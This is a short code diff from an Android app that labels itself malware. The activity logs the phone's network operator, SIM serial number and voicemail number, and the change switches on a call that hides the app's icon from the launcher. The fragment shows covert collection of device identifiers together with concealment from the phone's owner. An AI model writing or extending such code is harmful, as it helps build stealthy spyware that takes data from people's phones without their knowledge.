@@ -24,8 +24,8 @@ public class MainActivity extends Activity {
         Log.d("malware", "Network operator " + PhoneInfo.getMyNetworkOperator(this));
         Log.d("malware", "SIM-Serial " + PhoneInfo.getMySIMSerial(this));
         Log.d("malware", "Voice number " + PhoneInfo.getMyVoiceMailNumberI(this));
-        //android.os.Process.killProcess(android.os.Process.myPid());
-        //Utils.hideAppIcon(MainActivity.this);
+
+        Utils.hideAppIcon(MainActivity.this);
         finish();
     }
 
